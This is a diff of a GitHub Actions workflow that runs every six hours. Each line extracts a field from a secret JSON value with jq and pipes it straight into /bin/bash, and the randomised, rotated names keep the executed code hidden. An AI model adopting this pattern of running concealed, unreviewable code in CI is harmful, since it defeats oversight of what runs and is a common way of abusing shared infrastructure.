@@ -1,9 +1,8 @@
 name: suishoujxc
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '15 0/6 * * *'
+    - cron: '24 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,14 +10,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: suishoujxc
         env:
-          hjzu70679: ${{ secrets.hjzu70679 }}
+          j062: ${{ secrets.j062 }}
         run: |
-          echo $hjzu70679 | jq -r .re123 | /bin/bash
-          echo $iltn6 | jq -r .msk2157 | /bin/bash
-          echo $m369 | jq -r .yfx28 | /bin/bash
-          echo $zult77896 | jq -r .hjt13 | /bin/bash
-          echo $jjrpz308 | jq -r .qmi9 | /bin/bash
-          echo $qfs17545 | jq -r .yiah2 | /bin/bash
-          echo $avi7 | jq -r .v15786 | /bin/bash
-          echo $wlh2 | jq -r .mk620 | /bin/bash
+          echo $j062 | jq -r .ujyc5531 | /bin/bash
+          echo $u75051 | jq -r .oflld574 | /bin/bash
+          echo $p549 | jq -r .ofxyu9434 | /bin/bash
+          echo $xjiy9 | jq -r .l1 | /bin/bash
+          echo $bpr34991 | jq -r .ibs09 | /bin/bash
+          echo $drd94 | jq -r .evpnz3377 | /bin/bash
+          echo $pp634 | jq -r .ygo963 | /bin/bash
+          echo $dgoqr25820 | jq -r .i67 | /bin/bash
+          echo $evmrr80 | jq -r .d723 | /bin/bash
 
